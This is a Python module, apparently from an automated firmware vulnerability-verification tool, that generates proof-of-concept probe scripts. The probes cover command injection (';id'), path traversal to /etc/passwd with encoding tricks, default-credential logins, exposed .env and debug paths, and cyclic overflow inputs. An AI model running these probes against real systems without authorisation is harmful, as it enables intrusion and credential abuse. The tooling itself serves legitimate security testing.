from __future__ import annotations

import json
import textwrap
from dataclasses import dataclass
from typing import Callable


@dataclass(frozen=True)
class PoCContext:
    chain_id: str
    target_service: str
    candidate_id: str
    candidate_summary: str
    evidence_refs: list[str]
    families: list[str]
    crash_replay: dict[str, object] | None = None
    channels: list[dict[str, object]] | None = None
    plan_ir: dict[str, object] | None = None


@dataclass(frozen=True)
class PoCTemplate:
    vuln_type: str
    families: frozenset[str]
    description: str
    generate: Callable[[PoCContext], str]


_REGISTRY: dict[str, PoCTemplate] = {}


def register_template(template: PoCTemplate) -> None:
    _REGISTRY[template.vuln_type] = template


def select_template(families: list[str]) -> PoCTemplate | None:
    """Select the best PoC template for the given finding families.

    Matching priority: the template whose families frozenset has the largest
    intersection with the provided families list.  Returns None when no
    template matches any family at all.
    """
    if not families:
        return None

    families_lower = frozenset(f.lower() for f in families)
    best: PoCTemplate | None = None
    best_score = 0

    for template in _REGISTRY.values():
        template_families_lower = frozenset(f.lower() for f in template.families)
        score = len(families_lower & template_families_lower)
        if score > best_score:
            best_score = score
            best = template

    return best


def list_templates() -> list[str]:
    return sorted(_REGISTRY.keys())


# ---------------------------------------------------------------------------
# Template generators
# ---------------------------------------------------------------------------

def _generate_cmd_injection(ctx: PoCContext) -> str:
    chain_literal = json.dumps(ctx.chain_id)
    service_literal = json.dumps(ctx.target_service)
    candidate_literal = json.dumps(ctx.candidate_id)
    summary_literal = json.dumps(ctx.candidate_summary)
    return textwrap.dedent(
        f"""\
        from __future__ import annotations

        import hashlib
        import http.client
        import urllib.parse
        from datetime import datetime, timezone


        class PoCResult:
            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
                self.success = success
                self.proof_type = proof_type
                self.proof_evidence = proof_evidence
                self.timestamp = timestamp


        def _utc_now() -> str:
            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


        class PoC:
            chain_id = {chain_literal}
            target_service = {service_literal}

            _PROBE_PATHS = [
                "/cgi-bin/test?cmd=id",
                "/apply.cgi?action=;id",
                "/goform/set_cmd?cmd=id",
            ]
            _SUCCESS_PATTERN = "uid="

            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                self.target_ip = target_ip
                self.target_port = target_port
                self.context = context

            def execute(self) -> PoCResult:
                timestamp = _utc_now()
                evidence_prefix = (
                    "autopoc_mode=deterministic_nonweaponized "
                    + "candidate_id="
                    + {candidate_literal}
                    + " summary="
                    + {summary_literal}
                    + " probe=cmd_injection"
                )

                for probe_path in self._PROBE_PATHS:
                    try:
                        conn = http.client.HTTPConnection(
                            self.target_ip, int(self.target_port), timeout=3.0
                        )
                        conn.request("GET", probe_path)
                        resp = conn.getresponse()
                        body = resp.read(4096)
                        conn.close()
                        digest = hashlib.sha256(body).hexdigest()
                        if self._SUCCESS_PATTERN.encode() in body:
                            evidence = (
                                evidence_prefix
                                + f" port={{self.target_port}} path={{probe_path}}"
                                + f" status={{resp.status}} bytes={{len(body)}} readback_hash={{digest}}"
                            )
                            return PoCResult(
                                success=True,
                                proof_type="shell",
                                proof_evidence=evidence,
                                timestamp=timestamp,
                            )
                    except Exception:
                        continue

                evidence = (
                    evidence_prefix
                    + f" port={{self.target_port}} bytes=0 readback_hash=none"
                    + " result=no_cmd_injection_confirmed"
                )
                return PoCResult(
                    success=False,
                    proof_type="shell",
                    proof_evidence=evidence,
                    timestamp=timestamp,
                )

            def cleanup(self) -> None:
                return
        """
    )


def _generate_path_traversal(ctx: PoCContext) -> str:
    chain_literal = json.dumps(ctx.chain_id)
    service_literal = json.dumps(ctx.target_service)
    candidate_literal = json.dumps(ctx.candidate_id)
    summary_literal = json.dumps(ctx.candidate_summary)
    return textwrap.dedent(
        f"""\
        from __future__ import annotations

        import hashlib
        import http.client
        from datetime import datetime, timezone


        class PoCResult:
            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
                self.success = success
                self.proof_type = proof_type
                self.proof_evidence = proof_evidence
                self.timestamp = timestamp


        def _utc_now() -> str:
            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


        class PoC:
            chain_id = {chain_literal}
            target_service = {service_literal}

            _PROBE_PATHS = [
                "/cgi-bin/../../etc/passwd",
                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "/..%252f..%252f..%252fetc/passwd",
                "/cgi-bin/..%00/etc/passwd",
            ]
            _SUCCESS_PATTERN = "root:"

            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                self.target_ip = target_ip
                self.target_port = target_port
                self.context = context

            def execute(self) -> PoCResult:
                timestamp = _utc_now()
                evidence_prefix = (
                    "autopoc_mode=deterministic_nonweaponized "
                    + "candidate_id="
                    + {candidate_literal}
                    + " summary="
                    + {summary_literal}
                    + " probe=path_traversal"
                )

                for probe_path in self._PROBE_PATHS:
                    try:
                        conn = http.client.HTTPConnection(
                            self.target_ip, int(self.target_port), timeout=3.0
                        )
                        conn.request("GET", probe_path)
                        resp = conn.getresponse()
                        body = resp.read(4096)
                        conn.close()
                        digest = hashlib.sha256(body).hexdigest()
                        if self._SUCCESS_PATTERN.encode() in body:
                            evidence = (
                                evidence_prefix
                                + f" port={{self.target_port}} path={{probe_path}}"
                                + f" status={{resp.status}} bytes={{len(body)}} readback_hash={{digest}}"
                            )
                            return PoCResult(
                                success=True,
                                proof_type="arbitrary_read",
                                proof_evidence=evidence,
                                timestamp=timestamp,
                            )
                    except Exception:
                        continue

                evidence = (
                    evidence_prefix
                    + f" port={{self.target_port}} bytes=0 readback_hash=none"
                    + " result=no_path_traversal_confirmed"
                )
                return PoCResult(
                    success=False,
                    proof_type="arbitrary_read",
                    proof_evidence=evidence,
                    timestamp=timestamp,
                )

            def cleanup(self) -> None:
                return
        """
    )


def _generate_auth_bypass(ctx: PoCContext) -> str:
    chain_literal = json.dumps(ctx.chain_id)
    service_literal = json.dumps(ctx.target_service)
    candidate_literal = json.dumps(ctx.candidate_id)
    summary_literal = json.dumps(ctx.candidate_summary)
    return textwrap.dedent(
        f"""\
        from __future__ import annotations

        import base64
        import hashlib
        import http.client
        from datetime import datetime, timezone


        class PoCResult:
            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
                self.success = success
                self.proof_type = proof_type
                self.proof_evidence = proof_evidence
                self.timestamp = timestamp


        def _utc_now() -> str:
            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


        class PoC:
            chain_id = {chain_literal}
            target_service = {service_literal}

            _DEFAULT_CREDS = [
                ("admin", "admin"),
                ("admin", "password"),
                ("root", "root"),
                ("admin", ""),
                ("root", ""),
            ]
            _ADMIN_PATHS = [
                "/admin/",
                "/management/",
                "/cgi-bin/admin.cgi",
                "/config/",
            ]
            _SUCCESS_TOKENS = [b"admin", b"config", b"management", b"dashboard"]

            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                self.target_ip = target_ip
                self.target_port = target_port
                self.context = context

            def execute(self) -> PoCResult:
                timestamp = _utc_now()
                evidence_prefix = (
                    "autopoc_mode=deterministic_nonweaponized "
                    + "candidate_id="
                    + {candidate_literal}
                    + " summary="
                    + {summary_literal}
                    + " probe=auth_bypass"
                )

                # Phase 1: default credentials via HTTP Basic Auth
                for user, passwd in self._DEFAULT_CREDS:
                    try:
                        conn = http.client.HTTPConnection(
                            self.target_ip, int(self.target_port), timeout=3.0
                        )
                        cred = base64.b64encode(f"{{user}}:{{passwd}}".encode()).decode()
                        conn.request("GET", "/", headers={{"Authorization": f"Basic {{cred}}"}})
                        resp = conn.getresponse()
                        body = resp.read(4096)
                        conn.close()
                        digest = hashlib.sha256(body).hexdigest()
                        if resp.status == 200 and any(t in body.lower() for t in self._SUCCESS_TOKENS):
                            evidence = (
                                evidence_prefix
                                + f" port={{self.target_port}} cred={{user}}:***"
                                + f" status={{resp.status}} bytes={{len(body)}} readback_hash={{digest}}"
                            )
                            return PoCResult(
                                success=True,
                                proof_type="shell",
                                proof_evidence=evidence,
                                timestamp=timestamp,
                            )
                    except Exception:
                        continue

                # Phase 2: unauthenticated admin paths
                for admin_path in self._ADMIN_PATHS:
                    try:
                        conn = http.client.HTTPConnection(
                            self.target_ip, int(self.target_port), timeout=3.0
                        )
                        conn.request("GET", admin_path)
                        resp = conn.getresponse()
                        body = resp.read(4096)
                        conn.close()
                        digest = hashlib.sha256(body).hexdigest()
                        if resp.status == 200 and any(t in body.lower() for t in self._SUCCESS_TOKENS):
                            evidence = (
                                evidence_prefix
                                + f" port={{self.target_port}} path={{admin_path}}"
                                + f" status={{resp.status}} bytes={{len(body)}} readback_hash={{digest}}"
                            )
                            return PoCResult(
                                success=True,
                                proof_type="arbitrary_read",
                                proof_evidence=evidence,
                                timestamp=timestamp,
                            )
                    except Exception:
                        continue

                evidence = (
                    evidence_prefix
                    + f" port={{self.target_port}} bytes=0 readback_hash=none"
                    + " result=no_auth_bypass_confirmed"
                )
                return PoCResult(
                    success=False,
                    proof_type="arbitrary_read",
                    proof_evidence=evidence,
                    timestamp=timestamp,
                )

            def cleanup(self) -> None:
                return
        """
    )


def _generate_info_disclosure(ctx: PoCContext) -> str:
    chain_literal = json.dumps(ctx.chain_id)
    service_literal = json.dumps(ctx.target_service)
    candidate_literal = json.dumps(ctx.candidate_id)
    summary_literal = json.dumps(ctx.candidate_summary)
    return textwrap.dedent(
        f"""\
        from __future__ import annotations

        import hashlib
        import http.client
        from datetime import datetime, timezone


        class PoCResult:
            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
                self.success = success
                self.proof_type = proof_type
                self.proof_evidence = proof_evidence
                self.timestamp = timestamp


        def _utc_now() -> str:
            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


        class PoC:
            chain_id = {chain_literal}
            target_service = {service_literal}

            _PROBE_PATHS = [
                "/proc/version",
                "/.env",
                "/debug/",
                "/etc/config/",
                "/cgi-bin/info",
                "/server-status",
            ]
            _SENSITIVE_TOKENS = [
                b"linux version", b"password", b"secret", b"api_key",
                b"db_host", b"root:", b"version", b"debug",
            ]

            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                self.target_ip = target_ip
                self.target_port = target_port
                self.context = context

            def execute(self) -> PoCResult:
                timestamp = _utc_now()
                evidence_prefix = (
                    "autopoc_mode=deterministic_nonweaponized "
                    + "candidate_id="
                    + {candidate_literal}
                    + " summary="
                    + {summary_literal}
                    + " probe=info_disclosure"
                )

                for probe_path in self._PROBE_PATHS:
                    try:
                        conn = http.client.HTTPConnection(
                            self.target_ip, int(self.target_port), timeout=3.0
                        )
                        conn.request("GET", probe_path)
                        resp = conn.getresponse()
                        body = resp.read(4096)
                        conn.close()
                        digest = hashlib.sha256(body).hexdigest()
                        if resp.status == 200 and len(body) > 16:
                            body_lower = body.lower()
                            if any(t in body_lower for t in self._SENSITIVE_TOKENS):
                                evidence = (
                                    evidence_prefix
                                    + f" port={{self.target_port}} path={{probe_path}}"
                                    + f" status={{resp.status}} bytes={{len(body)}} readback_hash={{digest}}"
                                )
                                return PoCResult(
                                    success=True,
                                    proof_type="arbitrary_read",
                                    proof_evidence=evidence,
                                    timestamp=timestamp,
                                )
                    except Exception:
                        continue

                evidence = (
                    evidence_prefix
                    + f" port={{self.target_port}} bytes=0 readback_hash=none"
                    + " result=no_info_disclosure_confirmed"
                )
                return PoCResult(
                    success=False,
                    proof_type="arbitrary_read",
                    proof_evidence=evidence,
                    timestamp=timestamp,
                )

            def cleanup(self) -> None:
                return
        """
    )


def _generate_memory_stateful_probe(ctx: PoCContext) -> str:
    chain_literal = json.dumps(ctx.chain_id)
    service_literal = json.dumps(ctx.target_service)
    candidate_literal = json.dumps(ctx.candidate_id)
    summary_literal = json.dumps(ctx.candidate_summary)
    crash_hint = ctx.crash_replay if isinstance(ctx.crash_replay, dict) else {}
    offsets: list[int] = []
    offsets_any = crash_hint.get("cyclic_offsets")
    if isinstance(offsets_any, list):
        for item_any in offsets_any:
            if not isinstance(item_any, dict):
                continue
            off_any = item_any.get("offset")
            if isinstance(off_any, int) and off_any >= 0:
                offsets.append(off_any)
    first_offset = min(offsets) if offsets else -1
    probe_len = 384
    if first_offset >= 0:
        probe_len = max(384, min(2048, first_offset + 128))

    replay_meta: list[str] = []
    for key, label in (
        ("status", "crash_replay_status"),
        ("signal_name", "crash_replay_signal"),
        ("primitive_hint", "crash_replay_primitive"),
    ):
        value = crash_hint.get(key)
        if isinstance(value, str) and value:
            replay_meta.append(f"{label}={value}")
    if offsets:
        replay_meta.append("crash_replay_offsets=" + ",".join(str(off) for off in offsets[:6]))
    replay_meta_literal = json.dumps(" ".join(replay_meta))
    crash_hint_literal = repr(crash_hint)
    return textwrap.dedent(
        f"""\
        from __future__ import annotations

        import hashlib
        import http.client
        import urllib.parse
        from datetime import datetime, timezone


        class PoCResult:
            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
                self.success = success
                self.proof_type = proof_type
                self.proof_evidence = proof_evidence
                self.timestamp = timestamp


        def _utc_now() -> str:
            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


        def _cyclic(length: int) -> str:
            alphabet = "abcdefghijklmnopqrstuvwxyz"
            out = []
            for a in alphabet:
                for b in alphabet:
                    for c in alphabet:
                        out.append(a + b + c)
                        if len("".join(out)) >= length:
                            return "".join(out)[:length]
            return ("".join(out) * ((length // max(1, len("".join(out)))) + 1))[:length]


        class PoC:
            chain_id = {chain_literal}
            target_service = {service_literal}
            _PROBE_LEN = {probe_len}
            _CONTROL_OFFSET = {first_offset}
            _CRASH_REPLAY_HINT = {crash_hint_literal}
            _CRASH_REPLAY_EVIDENCE = {replay_meta_literal}

            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                self.target_ip = target_ip
                self.target_port = target_port
                self.context = context

            def execute(self) -> PoCResult:
                timestamp = _utc_now()
                marker = "SCOUT_PROOF"
                control_marker = "SCOUTCTRL"
                if 0 <= int(self._CONTROL_OFFSET) < int(self._PROBE_LEN):
                    tail_len = max(0, int(self._PROBE_LEN) - int(self._CONTROL_OFFSET) - len(control_marker))
                    pattern = _cyclic(int(self._CONTROL_OFFSET)) + control_marker + _cyclic(tail_len)
                else:
                    pattern = _cyclic(int(self._PROBE_LEN))
                evidence_prefix = (
                    "autopoc_mode=deterministic_lab_proof "
                    + "candidate_id="
                    + {candidate_literal}
                    + " summary="
                    + {summary_literal}
                    + " probe=memory_stateful"
                )
                if self._CRASH_REPLAY_EVIDENCE:
                    evidence_prefix = evidence_prefix + " " + self._CRASH_REPLAY_EVIDENCE
                probes = [
                    ("GET", "/cgi-bin/test?data=" + urllib.parse.quote(pattern)),
                    ("GET", "/apply.cgi?payload=" + urllib.parse.quote(pattern)),
                    ("GET", "/goform/set?input=" + urllib.parse.quote(pattern)),
                    ("GET", "/?probe=" + marker),
                ]
                for method, path in probes:
                    try:
                        conn = http.client.HTTPConnection(self.target_ip, int(self.target_port), timeout=3.0)
                        conn.request(method, path, headers={{"Connection": "close"}})
                        resp = conn.getresponse()
                        body = resp.read(4096)
                        conn.close()
                        digest = hashlib.sha256(body).hexdigest()
                        evidence = (
                            evidence_prefix
                            + f" port={{self.target_port}} path={{path}} status={{resp.status}}"
                            + f" bytes={{len(body)}} readback_hash={{digest}}"
                        )
                        if b"uid=" in body:
                            return PoCResult(True, "shell", evidence, timestamp)
                        if b"SCOUT_LEAK:" in body or b"root:" in body:
                            return PoCResult(True, "arbitrary_read", evidence, timestamp)
                    except Exception:
                        continue
                evidence = evidence_prefix + f" port={{self.target_port}} bytes=0 readback_hash=none result=no_memory_primitive_confirmed"
                return PoCResult(False, "arbitrary_read", evidence, timestamp)

            def cleanup(self) -> None:
                return
        """
    )


def _generate_config_state_machine_probe(ctx: PoCContext) -> str:
    chain_literal = json.dumps(ctx.chain_id)
    service_literal = json.dumps(ctx.target_service)
    candidate_literal = json.dumps(ctx.candidate_id)
    summary_literal = json.dumps(ctx.candidate_summary)
    channels_literal = repr(ctx.channels or [])
    plan_ir_literal = repr(ctx.plan_ir or {})
    return textwrap.dedent(
        f"""\
        from __future__ import annotations

        import hashlib
        import http.client
        import json
        import urllib.parse
        from datetime import datetime, timezone


        class PoCResult:
            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
                self.success = success
                self.proof_type = proof_type
                self.proof_evidence = proof_evidence
                self.timestamp = timestamp


        def _utc_now() -> str:
            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


        class PoC:
            chain_id = {chain_literal}
            target_service = {service_literal}
            _CHANNELS = {channels_literal}
            _PLAN_IR = {plan_ir_literal}

            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                self.target_ip = target_ip
                self.target_port = target_port
                self.context = context

            def _channel_targets(self) -> list[str]:
                targets = []
                for channel in self._CHANNELS:
                    if not isinstance(channel, dict):
                        continue
                    target = str(channel.get("target", "")).strip()
                    ctype = str(channel.get("channel_type", "")).strip()
                    if ctype == "web_api" and target.startswith("/"):
                        targets.append(target)
                if not targets:
                    targets.extend(["/cgi-bin/apply", "/cgi-bin/config", "/api/config"])
                return targets[:5]

            def _write_channel(self, path: str, marker: str) -> tuple[int, bytes, str]:
                field = "interface"
                for channel in self._CHANNELS:
                    if isinstance(channel, dict) and str(channel.get("channel_type")) == "config":
                        target = str(channel.get("target", "")).strip()
                        if target and target != "unknown":
                            field = target
                            break
                body = urllib.parse.urlencode({{field: marker, "scout_probe": marker}})
                headers = {{"Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}}
                conn = http.client.HTTPConnection(self.target_ip, int(self.target_port), timeout=3.0)
                conn.request("POST", path, body=body, headers=headers)
                resp = conn.getresponse()
                data = resp.read(4096)
                status = int(resp.status)
                conn.close()
                return status, data, field

            def _trigger_event(self) -> None:
                # Non-destructive trigger placeholder: the write request itself often
                # dispatches parser logic; a lab harness can map this to a reload endpoint.
                return

            def execute(self) -> PoCResult:
                timestamp = _utc_now()
                marker = "SCOUT_PROOF"
                evidence_prefix = (
                    "autopoc_mode=deterministic_nonweaponized "
                    + "candidate_id="
                    + {candidate_literal}
                    + " summary="
                    + {summary_literal}
                    + " probe=config_state_machine"
                )
                plan_digest = hashlib.sha256(json.dumps(self._PLAN_IR, sort_keys=True).encode()).hexdigest()
                for path in self._channel_targets():
                    try:
                        status, body, field = self._write_channel(path, marker)
                        self._trigger_event()
                        digest = hashlib.sha256(body).hexdigest()
                        evidence = (
                            evidence_prefix
                            + f" port={{self.target_port}} path={{path}} field={{field}} status={{status}}"
                            + f" bytes={{len(body)}} readback_hash={{digest}} plan_hash={{plan_digest}}"
                        )
                        if marker.encode() in body:
                            return PoCResult(True, "arbitrary_write", evidence, timestamp)
                    except Exception:
                        continue
                evidence = (
                    evidence_prefix
                    + f" port={{self.target_port}} bytes=0 readback_hash=none"
                    + f" plan_hash={{plan_digest}} result=no_config_state_machine_proof"
                )
                return PoCResult(False, "arbitrary_write", evidence, timestamp)

            def cleanup(self) -> None:
                return
        """
    )


def _generate_outbound_protocol_response_probe(ctx: PoCContext) -> str:
    chain_literal = json.dumps(ctx.chain_id)
    service_literal = json.dumps(ctx.target_service)
    candidate_literal = json.dumps(ctx.candidate_id)
    summary_literal = json.dumps(ctx.candidate_summary)
    channels_literal = repr(ctx.channels or [])
    plan_ir_literal = repr(ctx.plan_ir or {})
    return textwrap.dedent(
        f"""\
        from __future__ import annotations

        import base64
        import hashlib
        import json
        from datetime import datetime, timezone


        class PoCResult:
            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
                self.success = success
                self.proof_type = proof_type
                self.proof_evidence = proof_evidence
                self.timestamp = timestamp


        def _utc_now() -> str:
            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


        class PoC:
            chain_id = {chain_literal}
            target_service = {service_literal}
            _CHANNELS = {channels_literal}
            _PLAN_IR = {plan_ir_literal}
            _QUALITY_CHECKS = [
                "models_upstream_service_emulation_not_inbound_socket",
                "keeps_fields_short_and_non_overlong",
                "records_encoding_or_crypto_as_protocol_gap_without_reimplementing_payload",
                "requires_leak_before_control_flow_claim",
                "requires_live_lab_pcap_for_dynamic_upgrade",
            ]

            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                self.target_ip = target_ip
                self.target_port = target_port
                self.context = context

            def _safe_inner_fields(self) -> bytes:
                # Short benign field blueprint only. Delimiters/encodings are
                # placeholders for parser-shape planning; no overlong field,
                # ROP/control payload, or command string is generated here.
                fields = [
                    b"status=0",
                    b"message=SCOUT_PROBE",
                    b"error_code=7",
                    b"next_server=scout.invalid",
                ]
                return b"\\x01".join(fields)

            def _safe_outer_blueprint(self) -> bytes:
                inner = self._safe_inner_fields()
                encoded = base64.b64encode(inner)
                return b"Data=" + encoded + b"\\x01"

            def execute(self) -> PoCResult:
                timestamp = _utc_now()
                packet = self._safe_outer_blueprint()
                packet_hash = hashlib.sha256(packet).hexdigest()
                plan_hash = hashlib.sha256(json.dumps(self._PLAN_IR, sort_keys=True).encode()).hexdigest()
                channel_count = len(self._CHANNELS) if isinstance(self._CHANNELS, list) else 0
                evidence = (
                    "autopoc_mode=deterministic_nonweaponized "
                    + "candidate_id="
                    + {candidate_literal}
                    + " summary="
                    + {summary_literal}
                    + " probe=outbound_protocol_response_blueprint"
                    + f" target={{self.target_ip}}:{{self.target_port}}"
                    + f" safe_packet_bytes={{len(packet)}} readback_hash={{packet_hash}}"
                    + f" plan_hash={{plan_hash}} channel_count={{channel_count}}"
                    + " result=blueprint_only_no_network_send"
                    + " quality_checks="
                    + ",".join(self._QUALITY_CHECKS)
                )
                return PoCResult(False, "protocol_blueprint", evidence, timestamp)

            def cleanup(self) -> None:
                return
        """
    )


# ---------------------------------------------------------------------------
# Register built-in templates
# ---------------------------------------------------------------------------

register_template(
    PoCTemplate(
        vuln_type="outbound_protocol_response",
        families=frozenset({
            "outbound_protocol_response_parser",
            "stateful_response_parser",
            "lab_service_emulation_required",
            "info_leak_chain_candidate",
            "bounded_protocol_probe",
        }),
        description="Non-weaponized outbound protocol response blueprint quality probe",
        generate=_generate_outbound_protocol_response_probe,
    )
)

register_template(
    PoCTemplate(
        vuln_type="config_state_machine",
        families=frozenset({
            "config_derived_injection",
            "generic_config_parser",
            "command_injection_candidate",
        }),
        description="Plan-IR-aware Web/API -> Config -> daemon parser probe",
        generate=_generate_config_state_machine_probe,
    )
)

register_template(
    PoCTemplate(
        vuln_type="cmd_injection",
        families=frozenset({
            "cmd_injection",
            "command_injection",
            "cmd_exec_injection_risk",
            "authenticated_mgmt_cmd_path",
            "os_command_injection",
            "rce",
            "remote_code_execution",
        }),
        description="HTTP command injection probe via common CGI/form endpoints",
        generate=_generate_cmd_injection,
    )
)

register_template(
    PoCTemplate(
        vuln_type="path_traversal",
        families=frozenset({
            "path_traversal",
            "directory_traversal",
            "lfi",
            "local_file_inclusion",
            "arbitrary_file_read",
            "file_disclosure",
        }),
        description="HTTP path traversal probe with encoding variants",
        generate=_generate_path_traversal,
    )
)

register_template(
    PoCTemplate(
        vuln_type="auth_bypass",
        families=frozenset({
            "auth_bypass",
            "authentication_bypass",
            "default_credentials",
            "weak_auth",
            "hardcoded_credentials",
            "missing_authentication",
        }),
        description="Default credentials and unauthenticated admin path probe",
        generate=_generate_auth_bypass,
    )
)

register_template(
    PoCTemplate(
        vuln_type="info_disclosure",
        families=frozenset({
            "info_disclosure",
            "information_disclosure",
            "sensitive_data_exposure",
            "debug_endpoint",
            "config_exposure",
            "env_leak",
        }),
        description="Sensitive information disclosure probe via known debug/config paths",
        generate=_generate_info_disclosure,
    )
)

register_template(
    PoCTemplate(
        vuln_type="memory_stateful_probe",
        families=frozenset({
            "memory_corruption_candidate",
            "protocol_stateful_probe",
            "stack_overflow",
            "heap_corruption",
            "buffer_overflow",
            "controlled_write",
            "controlled_read",
        }),
        description="Bounded lab-only cyclic/stateful memory primitive probe",
        generate=_generate_memory_stateful_probe,
    )
)
